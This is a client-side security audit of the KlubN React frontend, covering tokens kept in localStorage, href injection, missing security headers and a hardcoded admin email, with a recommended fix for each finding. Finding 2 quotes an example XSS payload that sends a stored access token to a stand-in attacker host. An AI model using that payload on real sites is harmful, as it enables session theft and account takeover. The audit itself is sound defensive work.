# KlubN Pre-Production Security Audit — Frontend / Client-Side Security

**Date:** 2026-06-11
**Scope:** `Frontend/` (Vite + React 18 + TypeScript, Apollo Client, react-router-dom, Zustand cart)
**Dimension:** Frontend / Client-Side Security
**Mode:** Read-only. No application code modified.

---

## Summary table by severity

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | JWT access **and refresh token** stored in `localStorage` — full XSS token theft / persistent account takeover | **High** | `src/context/AuthContext.tsx:58-60`, `src/apollo-client.ts:31` |
| 2 | `javascript:`/`data:` URI injection via unvalidated user/ingested URLs placed in anchor `href` | **High** | `src/pages/MixesPage.tsx:161`, `src/pages/dj/DJMixesManager.tsx:307`, `src/pages/EventDetailPage.tsx:227`, `src/pages/DJProfilePage.tsx:478,483`, `src/pages/PlaylistDiscoveryPage.tsx:167-250` |
| 3 | No Content-Security-Policy / `X-Frame-Options` / `X-Content-Type-Options` delivered to the SPA | **Medium** | `Frontend/index.html` (no CSP); Traefik config out-of-scope here |
| 4 | Client-side admin "email backdoor" — hardcoded admin email grants `isAdmin` regardless of server role | **Medium** | `src/context/AuthContext.tsx:148-150` |
| 5 | 500→200 rewrite in Apollo fetch can mask/normalise server 500s into rendered GraphQL errors | **Low** | `src/apollo-client.ts:9-23` |
| 6 | Client-only route guards (correct pattern, but worth restating server is the boundary) | **Low** (informational) | `src/components/auth/*Route.tsx` |
| 7 | `target="_blank"` links using only `rel="noreferrer"` (acceptable) + raw `<a href>` for internal nav | **Low** | `Footer.tsx:60`, `ContactPage.tsx:140`, `LandingPage.tsx:1121`, admin pages |
| 8 | No CSRF token (acceptable given Bearer-header auth, not cookie auth) | **Informational** | `src/apollo-client.ts:30-38` |
| 9 | Stripe: publishable-key path not yet present client-side; only a display label exists | **Informational** | `src/pages/CheckoutReturnPage.tsx:33`, `EventTicketsPage.tsx:38` |

No `dangerouslySetInnerHTML`, no `eval`, no `innerHTML`/`document.write`, and **no secrets** found baked into the client bundle.

---

## Finding 1 — JWT access + refresh token in `localStorage` (High)

**Location:** `src/context/AuthContext.tsx:57-63`, read back at `:46-53`; access token also read in `src/apollo-client.ts:31`.

```tsx
// AuthContext.tsx:57
const persistSession = (accessToken: string, refreshToken: string, account: User) => {
  localStorage.setItem('accessToken', accessToken);
  localStorage.setItem('refreshToken', refreshToken);
  localStorage.setItem('user', JSON.stringify(account));
  ...
```
```ts
// apollo-client.ts:31
const token = localStorage.getItem('accessToken');
```

**Description:** Both the short-lived access token and the long-lived **refresh token** live in `localStorage`, which is readable by any JavaScript running on the origin. This directly violates the project's own global standard ("Never store sensitive data in `localStorage`/`sessionStorage`", `~/.claude/rules/web-standards.md`). The refresh token is the higher-value asset: stealing it grants durable, renewable access far beyond the access-token lifetime.

**Impact:** Any successful XSS on `klubn.no` (see Finding 2 for one live vector, plus any future dependency compromise) yields immediate, scriptable exfiltration of `accessToken` + `refreshToken`, i.e. full and *persistent* account takeover — including admin accounts, the door-scanner, and the ticketing/payment surface. With no CSP (Finding 3) there is no second line of defence. This is the single highest-leverage client-side risk because it converts *any* script-execution bug into account compromise. (OWASP A07:2021 Identification & Authentication Failures; OWASP ASVS V3.5 "do not store session tokens in localStorage".)

**Recommended fix (in priority order):**
1. Move the **refresh token** to a `Secure; HttpOnly; SameSite=Strict` cookie issued by the backend; JS must never see it. This alone removes persistent-takeover risk.
2. Keep the access token in memory (React state / module closure) only, re-acquiring via the refresh cookie on load. If a fallback store is unavoidable, prefer access-token-only with a short TTL.
3. As a defence-in-depth backstop until (1)/(2) land, ship a strict CSP (Finding 3) and fix the `href` injection vector (Finding 2) to shrink the XSS attack surface.

---

## Finding 2 — `javascript:` URI injection via unvalidated href (High)

**Locations (rendered with no scheme validation):**
- `src/pages/MixesPage.tsx:159-164` — `href={mix.mixUrl}`
- `src/pages/dj/DJMixesManager.tsx:306-313` — `href={mix.mixUrl}`
- `src/pages/LandingPage.tsx:1047-1051` — `href={mix.mixUrl}`
- `src/pages/EventDetailPage.tsx:225-234` — `href={event.ticketingUrl}`
- `src/pages/DJProfilePage.tsx:478,483` — `href={song.spotifyUrl}` / `song.soundCloudUrl`
- `src/pages/PlaylistDiscoveryPage.tsx:167,173,244,250` — Spotify/SoundCloud URLs
- `src/pages/admin/AdminPlaylistsPage.tsx:391,397`, `AdminMixesPage.tsx:292`, `AdminOrganizerApplicationsPage.tsx:75` (`app.website`)

```tsx
// MixesPage.tsx:159
<a key={mix.id} href={mix.mixUrl} target="_blank" rel="noopener noreferrer" ...>
```

**Description:** React escapes text children but does **not** sanitize URL attributes. A value such as `javascript:fetch('//evil/'+localStorage.accessToken)` placed in `mix.mixUrl`, `event.ticketingUrl`, `song.spotifyUrl`, or an organizer `website` will execute on click. These fields originate from **DJ-supplied profiles, event-organizer submissions, and the n8n social-media ingest pipeline** (scraped captions/links, `IsApproved=false` until moderated — but mixes/events are not all moderation-gated), i.e. attacker-influenceable data. This is a stored-XSS delivery path that chains directly into Finding 1 (token theft from `localStorage`).

Note the asymmetry: `src/utils/social.ts:isRealSocialUrl()` (used only on `LandingPage.tsx:1117` site-settings socials) *accidentally* neutralises bare `javascript:` by prepending `https://` when the value lacks an `http(s)://` prefix — but `mixUrl`, `ticketingUrl`, song URLs, and `app.website` get **no such guard**.

**Impact:** Stored XSS → arbitrary JS in a victim's session → token exfiltration (Finding 1) → account takeover. Reachable by any DJ, organizer, or anyone who can influence an ingested post. (OWASP A03:2021 Injection / Cross-Site Scripting.)

**Recommended fix:** Centralise a URL sanitizer and apply it everywhere a stored URL is rendered as `href` or `src`:
```ts
export const safeHttpUrl = (raw?: string | null): string | undefined => {
  if (!raw) return undefined;
  try {
    const u = new URL(raw.trim());
    return (u.protocol === 'https:' || u.protocol === 'http:') ? u.href : undefined;
  } catch { return undefined; }
};
```
Render `href={safeHttpUrl(mix.mixUrl)}` and hide the link when it returns `undefined`. Also validate/normalise these URLs **server-side** on write (ingest + DJ/organizer save) so the client guard is defence-in-depth, not the only check.

---

## Finding 3 — No CSP / security headers reaching the SPA (Medium)

**Location:** `Frontend/index.html:1-48` (no `http-equiv` CSP meta; only viewport/theme/OG tags).

**Description:** The SPA ships with no Content-Security-Policy, `X-Frame-Options`, or `X-Content-Type-Options`. The project standard explicitly requires `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options` (`~/.claude/rules/web-standards.md`). These are best set at the Traefik edge (out of this dimension's file scope), but **no evidence of them was found on the client side**, and a meta-CSP fallback is absent. `index.html` also loads fonts from three third-party origins (`api.fontshare.com`, `fonts.googleapis.com`, `fonts.gstatic.com`), which a CSP must allow-list explicitly.

**Impact:** Without CSP, Finding 2's XSS executes unrestricted and can exfiltrate to any origin; without `X-Frame-Options`/`frame-ancestors`, the door-scanner and admin portal are clickjackable. CSP is the standard mitigation that would blunt Findings 1 and 2 even if a script-injection bug slips through. (OWASP A05:2021 Security Misconfiguration; OWASP Secure Headers Project.)

**Recommended fix:** Add response headers at Traefik (preferred) — `Content-Security-Policy` with `default-src 'self'`, `script-src 'self'`, `connect-src 'self' <graphql-origin>`, `style-src 'self' 'unsafe-inline' fonts.googleapis.com api.fontshare.com`, `font-src fonts.gstatic.com api.fontshare.com`, `img-src 'self' data: <uploads-origin>`, `frame-ancestors 'none'`, plus `X-Content-Type-Options: nosniff` and `Referrer-Policy: strict-origin-when-cross-origin`. Cross-reference the infra/headers audit dimension to confirm these are configured at the edge.

---

## Finding 4 — Client-side hardcoded admin email backdoor (Medium)

**Location:** `src/context/AuthContext.tsx:148-150`.

```tsx
isAdmin:
  !!user &&
  (user.role === 'Admin' || user.email?.toLowerCase() === 'letsgoklubn@gmail.com'),
```

**Description:** `isAdmin` is true if the logged-in user's email equals a hardcoded address, independent of the server-assigned `role`. This is a client-side authorization shortcut and a hardcoded identity baked into the bundle.

**Impact:** Two problems. (a) **Information disclosure:** the privileged admin email is shipped in the public JS bundle, naming a high-value phishing/credential-stuffing target. (b) **Authorization drift:** the client will render admin UI for that email even if the backend later demotes the account; conversely it encourages trusting client role logic. This is only a true privilege escalation if the **backend** also honours email-based admin — that must be verified in the backend audit dimension. On the client alone it is an unnecessary, risky special-case. (OWASP A01:2021 Broken Access Control; A05 Security Misconfiguration.)

**Recommended fix:** Remove the email special-case; derive `isAdmin` solely from the server-issued `role`. Seed the admin role server-side (the project already has `ADMIN_EMAIL`/`ADMIN_DEFAULT_PASSWORD` first-run seeding) so no email literal is needed in client code. Confirm the backend never grants admin by email comparison.

---

## Finding 5 — 500→200 rewrite may mask server faults (Low)

**Location:** `src/apollo-client.ts:9-23`.

```ts
const graphqlFetch = async (input, init) => {
  const response = await fetch(input, init);
  if (response.status === 500) {
    const text = await response.text();
    try {
      const json = JSON.parse(text);
      if (json && Array.isArray(json.errors)) {
        return new Response(text, { status: 200, ... });   // rewrite 500 → 200
      }
    } catch { ... }
  }
  return response;
};
```

**Description:** This is a *legitimate* and documented workaround: HotChocolate 13 returns HTTP 500 when a non-null field resolves null (CLAUDE.md confirms), and Apollo would otherwise drop the error body. The rewrite only triggers when the body is valid JSON containing an `errors[]` array, so it is reasonably scoped.

**Impact / blind spot:** Any genuine server-side 500 that *happens to* serialise a JSON `{errors:[...]}` body is silently reclassified as a normal GraphQL error and surfaced to the UI/`onError` link. This can (a) hide real backend faults from network-level monitoring/alerting that keys on HTTP 5xx, and (b) leak backend error `message` text (stack-ish detail, internal field paths) into the rendered UI via `extractError` (`AuthContext.tsx:65-86`) and `console.error` (`apollo-client.ts:43`). It is not directly exploitable, but it weakens observability and risks verbose error disclosure.

**Recommended fix:** Keep the wrapper (it is load-bearing — do not remove without understanding HotChocolate behaviour) but: (1) ensure the **backend** returns generic, non-sensitive GraphQL error messages in production (no stack traces / internal paths), so what reaches the client is safe to display; (2) emit a distinct client-side telemetry signal when a 500-with-error-body is rewritten, so real server faults remain visible to monitoring; (3) gate verbose `console.error` of GraphQL messages to dev builds.

---

## Finding 6 — Client route guards are not a security boundary (Low / informational)

**Location:** `src/components/auth/AdminRoute.tsx`, `PortalRoute.tsx`, `ProtectedRoute.tsx`, `DJRoute.tsx`.

**Description:** The guards correctly gate rendering on `isAuthenticated`/`isAdmin`/`isCoAdmin`/`isDJ` and redirect unauthenticated users to `/login`. This is the right UX pattern. The guards derive role from `localStorage`-persisted `user` (`AuthContext.tsx:46-49`), which a user can trivially edit to flip `role` to `Admin` and render the admin/scanner/portal UI shells.

**Impact:** Rendering admin UI does **not** grant data access — every privileged GraphQL query/mutation (admin lists, `redeemTicket`, promo management, etc.) must be authorized server-side from the JWT, not from the client role. The risk is only realised if the **server** trusts client-asserted roles. This is a reminder to verify server-side enforcement in the backend/GraphQL audit dimension; no client-side fix is required beyond Finding 4.

**Recommended fix:** No client change. Verify in the backend audit that all admin/DJ/portal resolvers enforce `[Authorize(Roles=...)]` (or equivalent HotChocolate authorization) and that role comes from validated JWT claims — never from request-supplied data.

---

## Finding 7 — Outbound link hygiene (Low)

**Location:** `target="_blank"` usages across `Footer.tsx:60`, `ContactPage.tsx:140`, `LandingPage.tsx:1121`, `AdminOrganizerApplicationsPage.tsx:75`, `AdminPlaylistsPage.tsx:391,397`, `AdminMixesPage.tsx:292`, `DJMixesManager.tsx:308`, `DJTop10Manager.tsx:281,292`, etc.

**Description:** All audited `target="_blank"` links carry at least `rel="noreferrer"` (many also `noopener`). `noreferrer` implies `noopener`, and modern browsers default `_blank` to `noopener` anyway, so reverse-tabnabbing is **not** present. Separately, internal navigation in `Footer.tsx:41-49` uses raw `<a href="/contact">` instead of react-router `<Link>` — a full-page reload, not a security issue but it discards SPA state and slightly worsens the `/login?expired=1` redirect UX.

**Impact:** Negligible security impact. Listed for completeness and consistency.

**Recommended fix:** Standardise on `rel="noopener noreferrer"` for every external link (a few use only `noreferrer`). Use `<Link>` for internal routes. Both are cosmetic/consistency improvements.

---

## Finding 8 — CSRF posture (Informational)

**Location:** `src/apollo-client.ts:30-38`.

**Description:** Auth is carried as an `Authorization: Bearer <token>` header set per-request from `localStorage`, not via cookies. Because the token is not auto-attached by the browser, classic CSRF (which rides ambient cookie credentials) does not apply to the GraphQL surface as currently built.

**Impact:** No CSRF token is needed *today*. **However**, the recommended fix for Finding 1 (move the refresh token to an HttpOnly cookie) reintroduces ambient credentials on the refresh endpoint — that endpoint will then need CSRF protection (`SameSite=Strict` cookie + CSRF token or double-submit). Note this as a dependency when implementing Finding 1.

**Recommended fix:** None now. When adopting the HttpOnly-cookie refresh token, add `SameSite=Strict` + a CSRF defence on the refresh/logout endpoints.

---

## Finding 9 — Stripe & bundled secrets (Informational)

**Locations:** `src/pages/CheckoutReturnPage.tsx:33`, `src/pages/EventTicketsPage.tsx:38` (`Stripe: 'Card'` label only).

**Description:** Despite CLAUDE.md listing `@stripe/react-stripe-js`, **no Stripe SDK is in `Frontend/package.json`** and no Stripe Elements / publishable-key usage exists in `src/`. "Stripe" appears only as a provider display label. The live payment flow is redirect-based: the server returns a `redirectUrl` and the client does `window.location.href = payload.redirectUrl` (`EventTicketsPage.tsx:396`, `CheckoutReturnPage.tsx:111`). No card data touches the app — good.

A bundle-secret sweep of `import.meta.env.VITE_*` found only **public, non-secret** values: `VITE_API_URL` (GraphQL HTTP endpoint) and `VITE_UPLOAD_API_URL` (upload endpoint). No API keys, signing secrets, Stripe secret keys, or tokens are hardcoded in `src/`. `Qr__SigningSecret`, `N8N_SECRET`, JWT keys, and Vipps credentials are correctly absent from the client.

**Minor note (server-controlled redirect):** `window.location.href = payload.redirectUrl` trusts a server-returned URL for navigation. This is not a client open-redirect (the value is server-issued, not from `location`/query), but if/when Stripe Elements is added, keep the publishable key as `VITE_STRIPE_PUBLISHABLE_KEY` only and never the secret key. Confirm the backend constrains `redirectUrl` to known provider hosts.

**Recommended fix:** None required now. Update CLAUDE.md to reflect that Stripe is not yet wired client-side. When wiring it, use only the publishable key via a `VITE_`-prefixed var and Stripe.js/Elements so PCI scope stays SAQ-A.

---

## Cross-dimension verification handoffs
- **Backend/GraphQL audit:** confirm (a) admin/DJ/portal resolvers enforce role from validated JWT claims (Findings 4, 6); (b) the backend does **not** grant admin by email comparison (Finding 4); (c) production GraphQL error messages are generic (Finding 5); (d) ingested/DJ/organizer URLs are validated server-side on write (Finding 2); (e) `redirectUrl` is constrained to known provider hosts (Finding 9).
- **Infra/headers audit:** confirm CSP / `X-Frame-Options` / `X-Content-Type-Options` / `Referrer-Policy` are set at Traefik (Finding 3).
